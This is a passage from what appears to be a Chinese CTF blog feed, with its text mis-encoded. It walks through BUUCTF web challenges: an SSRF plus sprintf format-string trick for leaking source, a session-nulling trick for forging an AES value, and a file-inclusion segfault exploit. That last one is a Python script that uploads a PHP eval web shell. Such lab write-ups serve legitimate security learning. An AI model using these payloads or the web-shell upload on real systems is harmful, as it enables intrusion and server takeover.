class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (!isset($_COOKIE[&#39;y1ng&#39;]) || $_COOKIE[&#39;y1ng&#39;] !&#x3D;&#x3D; sha1(md5(&#39;y1ng&#39;)))&#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&#39;why you are here!&#39;);alert(&#39;fxck your scanner&#39;);alert(&#39;fxck you! get out!&#39;);&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">    header(&quot;Refresh:0.1;url&#x3D;index.php&quot;);</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str2 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br&gt;~$ &#39;;</span><br><span class="line">$str3 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br&gt;~$ &#39;;</span><br><span class="line">$str4 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br&gt;~$ &#39;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD XHTML 1.0 Transitional&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;xhtml1&#x2F;DTD&#x2F;xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt;</span><br><span class="line">    &lt;title&gt;File Detector&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;normalize.css&quot; &#x2F;&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;demo.css&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;component.css&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script src&#x3D;&quot;js&#x2F;modernizr.custom.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;section&gt;</span><br><span class="line">    &lt;form id&#x3D;&quot;theForm&quot; class&#x3D;&quot;simform&quot; autocomplete&#x3D;&quot;off&quot; action&#x3D;&quot;system.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;simform-inner&quot;&gt;</span><br><span class="line">            &lt;span&gt;&lt;p&gt;&lt;center&gt;File Detector&lt;&#x2F;center&gt;&lt;&#x2F;p&gt;&lt;&#x2F;span&gt;</span><br><span class="line">            &lt;ol class&#x3D;&quot;questions&quot;&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label for&#x3D;&quot;q1&quot;&gt;ä½ çŸ¥é“ç›®å½•ä¸‹éƒ½æœ‰ä»€ä¹ˆæ–‡ä»¶å—?&lt;&#x2F;label&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;input id&#x3D;&quot;q1&quot; name&#x3D;&quot;q1&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;li&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label for&#x3D;&quot;q2&quot;&gt;è¯·è¾“å…¥ä½ æƒ³æ£€æµ‹æ–‡ä»¶å†…å®¹é•¿åº¦çš„url&lt;&#x2F;label&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;input id&#x3D;&quot;q2&quot; name&#x3D;&quot;q2&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;li&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label for&#x3D;&quot;q1&quot;&gt;ä½ å¸Œæœ›ä»¥ä½•ç§æ–¹å¼è®¿é—®ï¼ŸGETï¼ŸPOST?&lt;&#x2F;label&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;input id&#x3D;&quot;q3&quot; name&#x3D;&quot;q3&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;li&gt;</span><br><span class="line">            &lt;&#x2F;ol&gt;</span><br><span class="line">            &lt;button class&#x3D;&quot;submit&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot;&gt;æäº¤&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;div class&#x3D;&quot;controls&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;next&quot;&gt;&lt;&#x2F;button&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;progress&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">                &lt;span class&#x3D;&quot;number&quot;&gt;</span><br><span class="line">&lt;span class&#x3D;&quot;number-current&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">&lt;span class&#x3D;&quot;number-total&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">&lt;&#x2F;span&gt;</span><br><span class="line">                &lt;span class&#x3D;&quot;error-message&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;span class&#x3D;&quot;final-message&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">    &lt;span&gt;&lt;p&gt;&lt;center&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;gem-love.com&quot; target&#x3D;&quot;_blank&quot;&gt;@é¢–å¥‡L&#39;Amore&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&lt;&#x2F;p&gt;&lt;&#x2F;span&gt;</span><br><span class="line">&lt;&#x2F;section&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;classie.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;stepsForm.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">    var theForm &#x3D; document.getElementById( &#39;theForm&#39; );</span><br><span class="line"></span><br><span class="line">    new stepsForm( theForm, &#123;</span><br><span class="line">        onSubmit : function( form ) &#123;</span><br><span class="line">            classie.addClass( theForm.querySelector( &#39;.simform-inner&#39; ), &#39;hide&#39; );</span><br><span class="line">            var messageEl &#x3D; theForm.querySelector( &#39;.final-message&#39; );</span><br><span class="line">            form.submit();</span><br><span class="line">            messageEl.innerHTML &#x3D; &#39;Ok...Let me have a check&#39;;</span><br><span class="line">            classie.addClass( messageEl, &#39;show&#39; );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; );</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$filter1 &#x3D; &#39;&#x2F;^http:\&#x2F;\&#x2F;127\.0\.0\.1\&#x2F;&#x2F;i&#39;;</span><br><span class="line">$filter2 &#x3D; &#39;&#x2F;.?f.?l.?a.?g.?&#x2F;i&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#39;q1&#39;]) &amp;&amp; isset($_POST[&#39;q2&#39;]) &amp;&amp; isset($_POST[&#39;q3&#39;]) ) &#123;</span><br><span class="line">    $url &#x3D; $_POST[&#39;q2&#39;].&quot;.y1ng.txt&quot;;</span><br><span class="line">    $method &#x3D; $_POST[&#39;q3&#39;];</span><br><span class="line"></span><br><span class="line">    $str1 &#x3D; &quot;~$ python fuck.py -u \&quot;&quot;.$url .&quot;\&quot; -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint&#x3D;xiangdemei&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    echo $str1;</span><br><span class="line"></span><br><span class="line">    if (!preg_match($filter1, $url) )&#123;</span><br><span class="line">        die($str2);</span><br><span class="line">    &#125;</span><br><span class="line">    if (preg_match($filter2, $url)) &#123;</span><br><span class="line">        die($str3);</span><br><span class="line">    &#125;</span><br><span class="line">    if (!preg_match(&#39;&#x2F;^GET&#x2F;i&#39;, $method) &amp;&amp; !preg_match(&#39;&#x2F;^POST&#x2F;i&#39;, $method)) &#123;</span><br><span class="line">        die($str4);</span><br><span class="line">    &#125;</span><br><span class="line">    $detect &#x3D; @file_get_contents($url, false);</span><br><span class="line">    print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>é‡ç‚¹å…³æ³¨ååŠæ®µPHPä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥è·å–åˆ°ä»¥ä¸‹çš„é™åˆ¶æ¡ä»¶ï¼š</p><p>1.ä¸èƒ½åŒ…å«æœ‰flagå­—ç¬¦ä¸²</p><p>2.q2çš„å€¼å¿…é¡»ä»¥<code>http://127.0.0.1/</code>å¼€å¤´ï¼Œå…¶å®ç›¸å½“äºæ˜¯é™åˆ¶äº†åªèƒ½é€šè¿‡SSRFè¯»å–æ–‡ä»¶</p><p>3.POSTè·å–äº†q1ã€q2ã€q3ä¸‰ä¸ªå€¼ï¼Œå…¶ä¸­q1å€¼å¹¶æ²¡æœ‰ä»€ä¹ˆé™åˆ¶ï¼Œq2åä¼šæ‹¼æ¥â€œ.y1ng.txtâ€å­—ç¬¦ä¸²ï¼Œq3ä¸­éœ€è¦ä»¥GETæˆ–POSTå­—ç¬¦ä¸²å¼€å¤´ã€‚</p><p>é¦–å…ˆæ˜¯æ— æ³•ç›´æ¥è¯»å–åˆ°flagæ–‡ä»¶ï¼Œé€šè¿‡home.phpæ–‡ä»¶çš„æºç æˆ‘ä»¬å¯ä»¥çŒœæµ‹åº”è¯¥è¿˜å­˜åœ¨admin.phpæ–‡ä»¶ã€‚å…¶æ¬¡å°±æ˜¯æˆ‘ä»¬ä¼ è¿›å»çš„URLå³q2å€¼ä¼šè¢«æ‹¼æ¥ä¸Šæ— ç”¨å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨URLååŠ  â€œ?a=(GETèµ‹å€¼ç»™ä¸€ä¸ªå‚æ•°)â€ æˆ– â€œ#(é”šç‚¹)â€ æ¥è®©å…¶å¤±æ•ˆï¼Œ</p><p>æœ€åä¸€ä¸ªè€ƒçš„ç‚¹å°±æ˜¯åœ¨è¿™ä¸¤è¡Œä»£ç ä¸Šï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$detect = @file_get_contents($url, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">print</span>(sprintf(<span class="string">&quot;<span class="subst">$url</span> method&amp;content_size:<span class="subst">$method</span>%d&quot;</span>, $detect));</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç‰µæ‰¯åˆ°äº†å­—ç¬¦ä¸²çš„æ ¼å¼åŒ–çš„çŸ¥è¯†ï¼Œ%dä¼šå°†$detectä»¥äºŒè¿›åˆ¶æ•°çš„å½¢å¼è¾“å‡ºï¼Œæ‰€ä»¥å¹¶ä¸èƒ½å¾—åˆ°æˆ‘ä»¬éœ€è¦çš„æºç ã€‚</p><p>è€Œä¸»è¦æ€è·¯å°±æ˜¯è®©$detectä»¥å­—ç¬¦ä¸²å½¢å¼ï¼ˆ%sï¼‰æ¥è¾“å‡ºï¼Œæˆ‘ä»¬æœ‰ä¸¤ç§è¯»å–admin.phpæºç çš„æ–¹æ³•ï¼š</p><ul><li><code> %1$s</code> â€”â€” è¿™ç§åŠæ³•åŸç†æ˜¯<code>%1$s</code>ä¼šå°†ç¬¬ä¸€ä¸ªå‚æ•°ç”¨stringç±»å‹è¾“å‡ºï¼Œè€Œè¿™é“é¢˜ä¸­ç¬¬ä¸€ä¸ªå‚æ•°ä¾¿æ˜¯admin.phpçš„æºç ï¼Œè¯­å¥æ˜¯ï¼š</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(sprintf(&quot;$url method&amp;content_size:&quot;GET%1$s%d&quot;, $detect));  &#x2F;&#x2F; %1$sä¼šä»¥å­—ç¬¦ä¸²æ ¼å¼è¾“å‡º$detectï¼Œè€Œ%dä¼šè¾“å‡º0</span><br></pre></td></tr></table></figure><ul><li><code>%s% </code>â€”â€” è¿™ç§åŠæ³•çš„åŸç†æ˜¯sprintf()å‡½æ•°ä¸­%å¯ä»¥è½¬ä¹‰æ‰%ï¼Œè¿™æ ·è¯­å¥å°±å˜æˆäº†ï¼š</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(sprintf(&quot;$url method&amp;content_size:&quot;GET%s%%d&quot;, $detect));  &#x2F;&#x2F; %då‰çš„%è¢«è½¬ä¹‰</span><br></pre></td></tr></table></figure><p>æ„é€ å‡ºPayloadï¼ŒPOSTå‘é€ç»™system.phpå³å¯è·å¾—<code>admin.php</code>çš„æºç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q1&#x3D;1&amp;q2&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;admin.php#&amp;q3&#x3D;GET%1$s </span><br></pre></td></tr></table></figure><p><code>admin.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">$f1ag = <span class="string">&#x27;f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;&#x27;</span>; <span class="comment">//fake</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span>(<span class="params">$data, $key</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $method = <span class="string">&#x27;AES-128-CBC&#x27;</span>;</span><br><span class="line">    $iv = md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;your_ip_address&#x27;</span>]) &amp;&amp; $_COOKIE[<span class="string">&#x27;your_ip_address&#x27;</span>] === md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &amp;&amp; $_COOKIE[<span class="string">&#x27;y1ng&#x27;</span>] === sha1(md5(<span class="string">&#x27;y1ng&#x27;</span>)))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size=&#x27;10px&#x27; color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is &quot;</span> . $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&#x27;user&#x27;</span>] = md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;decrypt&#x27;</span>])) &#123;</span><br><span class="line">    $decr = $_GET[<span class="string">&#x27;decrypt&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (Check())&#123;</span><br><span class="line">        $data = $_SESSION[<span class="string">&#x27;secret&#x27;</span>];</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;flag_2sln2ndln2klnlksnf.php&#x27;</span>;</span><br><span class="line">        $cipher = aesEn($data, <span class="string">&#x27;y1ng&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ($decr === $cipher)&#123;</span><br><span class="line">            <span class="keyword">echo</span> WHAT_YOU_WANT;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;çˆ¬&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        header(<span class="string">&quot;Refresh:0.1;url=index.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//I heard you can break PHP mt_rand seed</span></span><br><span class="line">    mt_srand(rand(<span class="number">0</span>,<span class="number">9999999</span>));</span><br><span class="line">    $length = mt_rand(<span class="number">40</span>,<span class="number">80</span>);</span><br><span class="line">    $_SESSION[<span class="string">&#x27;secret&#x27;</span>] = bin2hex(random_bytes($length));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä»£ç ä¸­ç¬¬ä¸€å±‚ifå¾ªç¯elseä»£ç å—ä¸­çš„mt_srandéšæœºæ•°æ˜¯çœŸéšæœºæ•°ï¼Œä¸èƒ½çˆ†ç ´ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªTrickï¼š</p><blockquote><p>sessionç»•è¿‡ã€‚åˆ é™¤cookieï¼Œæ²¡æœ‰cookieä¸­çš„SESSIONIDå°±æ‰¾ä¸åˆ°å¯¹åº”çš„sessionæ–‡ä»¶ï¼Œç›¸åº”çš„$_SESSION[â€˜varâ€™]å°±ä¸ºNULLï¼Œç›¸å½“äºä¼ å‚NULLã€‚</p><p><a href="https://www.jianshu.com/p/9c031dee57b7">https://www.jianshu.com/p/9c031dee57b7</a></p></blockquote><p>æ‰€ä»¥åªè¦æˆ‘ä»¬åœ¨è®¿é—®admin.phpæ—¶ï¼Œåˆ é™¤sessionè®¿é—®ï¼Œä»£ç å°±ä¼šå˜æˆï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cipher &#x3D; aesEn(&#39;&#39;, &#39;y1ng&#39;);</span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬å°±å¯ä»¥è®¡ç®—å‡ºå¯†é’¥ï¼Œä»è€Œè·å¾—Flagã€‚</p><p>æŠŠåŠ å¯†ç®—æ³•æ”¹ä¸€ä¸‹å¾—åˆ°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function aesEn($data, $key)&#123;</span><br><span class="line">    $method &#x3D; &#39;AES-128-CBC&#39;;</span><br><span class="line">    $iv &#x3D; md5(&#39;174.0.0.2&#39;,true);</span><br><span class="line">    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo aesEn(&#39;&#39;, &#39;y1ng&#39;)</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200712125104.png" alt=""></p><h2 id="NPUCTF2020-ezinclude">NPUCTF2020 ezinclude</h2><h3 id="è€ƒç‚¹-v6">è€ƒç‚¹</h3><ul><li>æ–‡ä»¶åŒ…å«</li><li>php Segfault</li></ul><h3 id="è§£é¢˜-v6">è§£é¢˜</h3><p>ä¸€è¿›æ¥æç¤º uername/password errorï¼Œçœ‹çš„æˆ‘ä¸€è„¸æ‡µé€¼ã€‚æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹cookie</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200921155251.png" alt=""></p><p>ç›´æ¥ç»™äº†Hashå€¼ï¼ŒGETå‚æ•°pass=Hashå€¼ã€‚</p><p>è·³è½¬åˆ°404é¡µé¢ï¼Œä½†æ˜¯ä¸­é—´æ˜æ˜¾æœ‰ä¸€ä¸ªlocationé‡å®šå‘ï¼Œç”¨bpé‡æ”¾ã€‚</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200921155451.png" alt=""></p><p>å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼ŒPHPä¼ªåè®®è¯»ç‰©æ–‡ä»¶</p><p>index.php</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200921155706.png" alt=""></p><p>flflflflag.php</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200921155752.png" alt=""></p><p>æŸ¥çœ‹PHPç‰ˆæœ¬7.0.3ï¼Œå¯ä»¥ä½¿ç”¨PHP Segfaultä¸Šä¼ shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">file_data = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: BytesIO(<span class="string">b&quot;&lt;?php eval($_POST[cmd]);&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;http://db4c33c0-8231-45b5-8aec-dbcadfeb8704.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.post(url=url, files=file_data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure><p>flagåœ¨phpinfoä¸­ã€‚</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200921160053.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;BUUCTFåˆ·é¢˜â€”â€”æ–‡ä»¶åŒ…å«&quot;&gt;BUUCTFåˆ·é¢˜â€”â€”æ–‡ä»¶åŒ…å«&lt;/h1&gt;
&lt;h2 id=&quot;BSidesCTF2020-Had-a-bad-day&quot;&gt;BSidesCTF2020 Had a bad day&lt;/h2&gt;
&lt;h3 id=&quot;è€ƒç‚¹&quot;&gt;è€ƒç‚¹&lt;/h3&gt;
&lt;ul&gt;
&lt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
      <category term="æ–‡ä»¶åŒ…å«" scheme="http://ca0y1h.top/categories/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>buuctfåˆ·é¢˜â€”â€”æ–‡ä»¶ä¸Šä¼ </title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/11.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/11.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2020-08-18T09:59:14.000Z</published>
    <updated>2020-09-16T05:47:37.133Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Upload">æå®¢å¤§æŒ‘æˆ˜ 2019 Upload</h2><h3 id="è€ƒç‚¹">è€ƒç‚¹</h3><ul><li>phtmlç»•è¿‡åç¼€</li><li>scriptç»•è¿‡&lt;?</li></ul><h3 id="è§£é¢˜">è§£é¢˜</h3><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200818233431.png" alt=""></p><h2 id="ACTF2020-æ–°ç”Ÿèµ›-Upload">ACTF2020 æ–°ç”Ÿèµ› Upload</h2><h3 id="è€ƒç‚¹-v2">è€ƒç‚¹</h3><ul><li>phtmlåç¼€ç»•è¿‡</li></ul><h3 id="è§£é¢˜-v2">è§£é¢˜</h3><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200818232047.png" alt=""></p><h2 id="GXYCTF2019-BabyUpload">GXYCTF2019 BabyUpload</h2><h3 id="è€ƒç‚¹-v3">è€ƒç‚¹</h3><ul><li>.htaccessè§£æç»•è¿‡</li></ul><h3 id="è§£é¢˜-v3">è§£é¢˜</h3><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200819085908.png" alt=""></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200819090013.png" alt=""></p><h2 id="RoarCTF-2019-SimpleUpload">RoarCTF 2019 SimpleUpload</h2><h3 id="è€ƒç‚¹-v4">è€ƒç‚¹</h3><ul><li>æ¡ä»¶ç«äº‰</li></ul><h3 id="è§£é¢˜-v4">è§£é¢˜</h3><p>æ 